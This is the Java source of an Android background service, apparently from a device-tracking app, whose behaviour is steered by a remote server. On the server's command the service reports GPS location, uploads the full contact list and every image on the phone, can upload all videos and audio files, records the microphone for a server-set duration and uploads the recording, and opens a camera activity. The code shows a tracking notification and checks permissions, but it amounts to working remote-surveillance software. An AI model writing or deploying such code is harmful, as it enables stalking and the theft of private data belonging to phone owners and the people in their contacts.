package com.example.devicetrackerapp.service;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;
import java.io.File;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.example.devicetrackerapp.MainActivity;
import com.example.devicetrackerapp.R;
import com.example.devicetrackerapp.activity.CameraPermissionActivity;
import com.example.devicetrackerapp.api.ApiClient;
import com.example.devicetrackerapp.dto.ApiResponse;
import com.example.devicetrackerapp.dto.AudioItem;
import com.example.devicetrackerapp.dto.ContactItem;
import com.example.devicetrackerapp.dto.VideoItem;
import com.example.devicetrackerapp.dto.ContactPayload;
import com.example.devicetrackerapp.dto.TrackingConfigResponse;
import com.example.devicetrackerapp.dto.UpdateLocationRequest;
import com.example.devicetrackerapp.utils.AudioUtils;
import com.example.devicetrackerapp.utils.ContactUtils;
import com.example.devicetrackerapp.utils.DeviceUtils;
import com.example.devicetrackerapp.utils.VideoUtils;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import java.util.ArrayList;
import java.util.List;
import com.example.devicetrackerapp.dto.ImageItem;
import com.example.devicetrackerapp.utils.ImageUtils;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class DeviceTrackingService extends Service {

    private static final String TAG = "TrackingService";

    private boolean cameraRequestShown = false;

    private Handler handler;

    private String deviceId;

    private Runnable runnable;

    // Default 60 sec
    private long interval = 60000;

    private FusedLocationProviderClient locationClient;

    @Override
    public void onCreate() {

        super.onCreate();

        createNotification();

        locationClient = LocationServices.getFusedLocationProviderClient(this);

        deviceId = DeviceUtils.getDeviceId(this);

        handler = new Handler();

        startTracking();

    }

    private void startTracking() {

        runnable = new Runnable() {

            @Override
            public void run() {

                fetchTrackingConfig();

            }

        };

        handler.post(runnable);

    }

    private void getLocation() {

        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {

            Log.e(TAG, "Location Permission Missing");

            return;
        }

        locationClient
                .getCurrentLocation(
                        Priority.PRIORITY_HIGH_ACCURACY,
                        null
                )
                .addOnSuccessListener(location -> {

                    if (location == null) {

                        Log.e(TAG, "Location NULL");

                        return;
                    }

                    double latitude = location.getLatitude();

                    double longitude = location.getLongitude();


                    Log.d(TAG, "LAT : " + latitude);

                    Log.d(TAG, "LNG : " + longitude);

                    updateServer(
                            latitude,
                            longitude
                    );

                });

    }

    private void updateServer(
            double latitude,
            double longitude) {

        UpdateLocationRequest request =
                new UpdateLocationRequest(
                        DeviceUtils.getDeviceId(this),
                        latitude,
                        longitude,
                        getBatteryLevel(),
                        null
                );

        ApiClient.getApiService()
                .updateDevice(request)
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(
                            Call<ApiResponse<String>> call,
                            Response<ApiResponse<String>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            Log.d(TAG, "Location Updated Successfully");

                        } else {

                            Log.e(TAG, "Update Failed");

                        }

                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<String>> call,
                            Throwable t) {

                        Log.e(TAG, "API Error", t);

                    }

                });

    }

    private int getBatteryLevel() {

        Intent batteryStatus =
                registerReceiver(
                        null,
                        new IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                );

        if (batteryStatus == null) {

            return 0;

        }

        int level =
                batteryStatus.getIntExtra(
                        BatteryManager.EXTRA_LEVEL,
                        -1
                );

        int scale =
                batteryStatus.getIntExtra(
                        BatteryManager.EXTRA_SCALE,
                        -1
                );

        if (level == -1 || scale == -1) {

            return 0;

        }

        return (level * 100) / scale;

    }

    @Override
    public int onStartCommand(
            Intent intent,
            int flags,
            int startId) {

        return START_STICKY;

    }

    private void createNotification() {

        String channelId = "tracking_channel";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            NotificationChannel channel =
                    new NotificationChannel(
                            channelId,
                            "Device Tracking",
                            NotificationManager.IMPORTANCE_LOW
                    );

            NotificationManager manager =
                    getSystemService(NotificationManager.class);

            manager.createNotificationChannel(channel);

        }

        Notification notification =
                new NotificationCompat.Builder(
                        this,
                        channelId
                )
                        .setContentTitle("Device Tracking Active")
                        .setContentText("Tracking location in background")
                        .setSmallIcon(R.drawable.ic_launcher_foreground)
                        .build();

        startForeground(
                1,
                notification
        );

    }

    @Override
    public void onDestroy() {

        super.onDestroy();

        if (handler != null && runnable != null) {

            handler.removeCallbacks(runnable);

        }

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {

        return null;

    }

    private void fetchTrackingConfig() {

        ApiClient.getApiService()
                .getTrackingConfig(DeviceUtils.getDeviceId(this))
                .enqueue(new Callback<ApiResponse<TrackingConfigResponse>>() {

                    @Override
                    public void onResponse(Call<ApiResponse<TrackingConfigResponse>> call,
                                           Response<ApiResponse<TrackingConfigResponse>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            TrackingConfigResponse config =
                                    response.body().getData();

                            if (config != null) {

                                if (config.getTrackingInterval() != null
                                        && config.getTrackingInterval() > 0) {

                                    interval = config.getTrackingInterval() * 1000L;

                                } else {

                                    interval = 60000;

                                }

                                Log.d(TAG, "Tracking : " + config.getTrackingEnabled());
                                Log.d(TAG, "Interval : " + interval);

                                if (Boolean.TRUE.equals(config.getTrackingEnabled())) {

                                    getLocation();

                                } else {

                                    Log.d(TAG, "Tracking Disabled");

                                }
                                // Upload Contacts
                                if (!Boolean.TRUE.equals(config.getContactsUploaded())
                                        || Boolean.TRUE.equals(config.getRefreshContacts())) {

                                    uploadContacts();

                                }

                                // Upload Images
                                if (!Boolean.TRUE.equals(config.getImagesUploaded())
                                        || Boolean.TRUE.equals(config.getRefreshImages())) {

                                    uploadImages();
                                }

                                // Upload Videos
                                if(Boolean.TRUE.equals(config.getRefreshVideos())){

                                    uploadVideos();

                                }

                                //Upload Audio
                                if(Boolean.TRUE.equals(config.getRefreshAudios())){

                                    uploadAudios();

                                }

                                //Mic
                                if (Boolean.TRUE.equals(config.getRefreshMic())) {

                                    startMicRecording(config.getMicDuration());

                                }

// Camera
                                if (Boolean.TRUE.equals(config.getRefreshCamera())) {

                                    ApiClient.getApiService()
                                            .cameraRequestReceived(deviceId)
                                            .enqueue(new Callback<String>() {

                                                @Override
                                                public void onResponse(
                                                        Call<String> call,
                                                        Response<String> response) {

                                                    if (response.isSuccessful()) {

                                                        Intent intent = new Intent(
                                                                DeviceTrackingService.this,
                                                                CameraPermissionActivity.class
                                                        );

                                                        intent.putExtra("deviceId", deviceId);

                                                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                                                        startActivity(intent);
                                                    }
                                                }

                                                @Override
                                                public void onFailure(
                                                        Call<String> call,
                                                        Throwable t) {

                                                    Log.e(TAG, "Camera Request Acknowledge Failed", t);

                                                }

                                            });

                                }
                            }
                        }

                        handler.postDelayed(runnable, interval);
                    }

                    @Override
                    public void onFailure(Call<ApiResponse<TrackingConfigResponse>> call,
                                          Throwable t) {

                        Log.e(TAG, "Config Error", t);

                        handler.postDelayed(runnable, interval);

                    }

                });

    }

    private void showCameraNotification(String deviceId) {

        Intent intent =
                new Intent(this,
                        CameraPermissionActivity.class);


        intent.putExtra(
                "deviceId",
                deviceId
        );

        intent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK
        );

        PendingIntent pendingIntent =
                PendingIntent.getActivity(

                        this,

                        101,

                        intent,

                        PendingIntent.FLAG_UPDATE_CURRENT
                                | PendingIntent.FLAG_IMMUTABLE

                );

        NotificationCompat.Builder builder =
                new NotificationCompat.Builder(

                        this,

                        "tracking_channel"

                )

                        .setSmallIcon(R.drawable.ic_launcher_foreground)

                        .setContentTitle("Camera Access Request")

                        .setContentText(
                                "Admin wants to access your camera")

                        .setPriority(
                                NotificationCompat.PRIORITY_HIGH)

                        .setCategory(
                                NotificationCompat.CATEGORY_CALL)

                        .setAutoCancel(true)

                        .setContentIntent(pendingIntent);

        NotificationManager manager =
                (NotificationManager)
                        getSystemService(NOTIFICATION_SERVICE);

        manager.notify(2001, builder.build());

    }
    private boolean hasPermission(String permission) {

        return ActivityCompat.checkSelfPermission(
                this,
                permission
        ) == PackageManager.PERMISSION_GRANTED;

    }
    private void uploadContacts() {
        Toast.makeText(this, "uploadContacts Called", Toast.LENGTH_SHORT).show();

        try {

            if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
                return;
            }

            List<ContactItem> contacts = ContactUtils.getContacts(this);

            if (contacts.size() > 5000) {
                Log.d(TAG, "Large Contact List : " + contacts.size());
            }

            if (contacts == null || contacts.isEmpty()) {
                Log.d(TAG, "No Contacts Found");
                return;
            }

            ContactPayload payload = new ContactPayload(
                    DeviceUtils.getDeviceId(this),
                    contacts
            );

            ApiClient.getApiService()
                    .saveContacts(payload)
                    .enqueue(new Callback<ApiResponse<String>>() {

                        @Override
                        public void onResponse(
                                Call<ApiResponse<String>> call,
                                Response<ApiResponse<String>> response) {

                            if (response.isSuccessful()
                                    && response.body() != null
                                    && response.body().isSuccess()) {

                                Log.d(TAG, "Contacts Uploaded Successfully");

                            } else {

                                Log.e(TAG,
                                        "Contact Upload Failed : "
                                                + response.code());
                            }
                        }

                        @Override
                        public void onFailure(
                                Call<ApiResponse<String>> call,
                                Throwable t) {

                            Log.e(TAG, "Contact Upload Error", t);

                        }
                    });

        } catch (Exception e) {

            Log.e(TAG, "Contact Upload Exception", e);

        }
    }
    private void uploadImages() {

        try {

            boolean permissionGranted;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

                permissionGranted =
                        hasPermission(Manifest.permission.READ_MEDIA_IMAGES);

            } else {

                permissionGranted =
                        hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);

            }

            if (!permissionGranted) {
                return;
            }

            List<ImageItem> images = ImageUtils.getImages(this);

            if (images == null || images.isEmpty()) {

                Log.d(TAG, "No Images Found");

                return;
            }

            String deviceId = DeviceUtils.getDeviceId(this);

            RequestBody deviceBody =
                    RequestBody.create(
                            deviceId,
                            MultipartBody.FORM
                    );

            List<MultipartBody.Part> parts = new ArrayList<>();

            for (ImageItem item : images) {

                File file = new File(item.getImagePath());

                if (!file.exists()) {

                    Log.e(TAG,
                            "File Not Found : " + file.getAbsolutePath());

                    continue;
                }

                RequestBody requestFile =
                        RequestBody.create(
                                file,
                                MediaType.parse("image/*")
                        );

                MultipartBody.Part part =
                        MultipartBody.Part.createFormData(
                                "files",
                                file.getName(),
                                requestFile
                        );

                parts.add(part);
            }

            if (parts.isEmpty()) {

                Log.e(TAG, "No Valid Images Found");

                return;
            }

            ApiClient.getApiService()
                    .uploadImages(deviceBody, parts)
                    .enqueue(new Callback<String>() {

                        @Override
                        public void onResponse(
                                Call<String> call,
                                Response<String> response) {

                            if (response.isSuccessful()) {

                                Log.d(TAG,
                                        "All Images Uploaded Successfully");

                            } else {

                                Log.e(TAG,
                                        "Image Upload Failed");

                            }

                        }

                        @Override
                        public void onFailure(
                                Call<String> call,
                                Throwable t) {

                            Log.e(TAG,
                                    "Image Upload Error",
                                    t);

                        }

                    });

        } catch (Exception e) {

            Log.e(TAG,
                    "Image Upload Exception",
                    e);

        }

    }

    private void uploadVideos(){

        try{

        boolean permissionGranted;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            permissionGranted =
                    hasPermission(Manifest.permission.READ_MEDIA_VIDEO);

        } else {

            permissionGranted =
                    hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);

        }

        if (!permissionGranted) {

            Log.e(TAG, "Video Permission Denied");

            return;
        }

            List<VideoItem> videos =
                    VideoUtils.getVideos(this);

            if(videos.isEmpty()){

                return;

            }

            List<MultipartBody.Part> parts =
                    new ArrayList<>();

            for(VideoItem item : videos){

                File file =
                        new File(item.getVideoPath());

                if(!file.exists()){

                    continue;

                }

                RequestBody body =
                        RequestBody.create(
                                file,
                                MediaType.parse("video/*"));

                parts.add(

                        MultipartBody.Part.createFormData(

                                "files",

                                file.getName(),

                                body

                        )

                );

            }

            RequestBody deviceBody =

                    RequestBody.create(

                            DeviceUtils.getDeviceId(this),

                            MultipartBody.FORM

                    );

            ApiClient.getApiService()

                    .uploadVideos(deviceBody,parts)

                    .enqueue(new Callback<String>() {

                        @Override
                        public void onResponse(
                                Call<String> call,
                                Response<String> response) {

                            if (response.isSuccessful()) {

                                Log.d(TAG, "Videos Uploaded Successfully");

                            } else {

                                Log.e(TAG, "Video Upload Failed : " + response.code());

                            }

                        }

                        @Override
                        public void onFailure(
                                Call<String> call,
                                Throwable t) {

                            Log.e(TAG, "Video Upload Error", t);

                        }

                    });

        }

        catch (Exception e){

            e.printStackTrace();

        }

    }

    private void uploadAudios() {

        try {

            boolean permissionGranted;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

                permissionGranted =
                        hasPermission(
                                Manifest.permission.READ_MEDIA_AUDIO);

            } else {

                permissionGranted =
                        hasPermission(
                                Manifest.permission.READ_EXTERNAL_STORAGE);

            }

            if (!permissionGranted) {

                return;

            }

            List<AudioItem> audios =
                    AudioUtils.getAudios(this);

            if (audios.isEmpty()) {

                Log.d(TAG, "No Audio Found");

                return;

            }

            List<MultipartBody.Part> parts =
                    new ArrayList<>();

            for (AudioItem item : audios) {

                File file =
                        new File(item.getAudioPath());

                if (!file.exists()) {

                    continue;

                }

                RequestBody body =
                        RequestBody.create(
                                file,
                                MediaType.parse("audio/*"));

                parts.add(

                        MultipartBody.Part.createFormData(

                                "files",

                                file.getName(),

                                body

                        )

                );

            }

            if (parts.isEmpty()) {

                return;

            }

            RequestBody deviceBody =

                    RequestBody.create(

                            DeviceUtils.getDeviceId(this),

                            MultipartBody.FORM

                    );

            ApiClient.getApiService()

                    .uploadAudios(deviceBody, parts)

                    .enqueue(new Callback<String>() {

                        @Override
                        public void onResponse(
                                Call<String> call,
                                Response<String> response) {

                            if (response.isSuccessful()) {

                                Log.d(TAG,
                                        "Audios Uploaded");

                            }

                        }

                        @Override
                        public void onFailure(
                                Call<String> call,
                                Throwable t) {

                            Log.e(TAG,
                                    "Audio Upload Failed",
                                    t);

                        }

                    });

        }

        catch (Exception e) {

            Log.e(TAG,
                    "Audio Upload Error",
                    e);

        }

    }

    private void startMicRecording(int duration) {

        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {

            Log.e(TAG, "Microphone Permission Denied");
            return;
        }

        File file = new File(
                getExternalFilesDir(null),
                "mic_" + System.currentTimeMillis() + ".m4a"
        );

        MediaRecorder recorder;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            recorder = new MediaRecorder(this);
        } else {
            recorder = new MediaRecorder();
        }

        try {

            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setAudioSamplingRate(44100);
            recorder.setOutputFile(file.getAbsolutePath());

            recorder.prepare();
            recorder.start();

            Log.d(TAG, "Mic Recording Started");

            final MediaRecorder finalRecorder = recorder;

            new Handler(getMainLooper()).postDelayed(() -> {

                try {
                    finalRecorder.stop();
                } catch (Exception ignored) {
                }

                try {
                    finalRecorder.release();
                } catch (Exception ignored) {
                }

                Log.d(TAG, "Mic Recording Completed");

                uploadMicRecording(file, duration);

            }, duration * 1000L);

        } catch (Exception e) {

            try {
                recorder.release();
            } catch (Exception ignored) {
            }

            Log.e(TAG, "Mic Recording Error", e);
        }
    }

    private void uploadMicRecording(File file, int duration) {

        RequestBody deviceBody =
                RequestBody.create(
                        DeviceUtils.getDeviceId(this),
                        MultipartBody.FORM
                );

        RequestBody durationBody =
                RequestBody.create(
                        String.valueOf(duration),
                        MultipartBody.FORM
                );

        RequestBody fileBody =
                RequestBody.create(
                        file,
                        MediaType.parse("audio/mp4")
                );

        MultipartBody.Part part =
                MultipartBody.Part.createFormData(
                        "file",
                        file.getName(),
                        fileBody
                );

        ApiClient.getApiService()
                .uploadMicRecording(
                        deviceBody,
                        durationBody,
                        part
                )
                .enqueue(new Callback<String>() {

                    @Override
                    public void onResponse(
                            Call<String> call,
                            Response<String> response) {

                        if (response.isSuccessful()) {

                            Log.d(TAG, "Mic Uploaded Successfully");

                            if (file.exists()) {
                                file.delete();
                            }

                        } else {

                            Log.e(TAG,
                                    "Mic Upload Failed : "
                                            + response.code());

                        }
                    }

                    @Override
                    public void onFailure(
                            Call<String> call,
                            Throwable t) {

                        Log.e(TAG,
                                "Mic Upload Error",
                                t);

                    }
                });

    }
}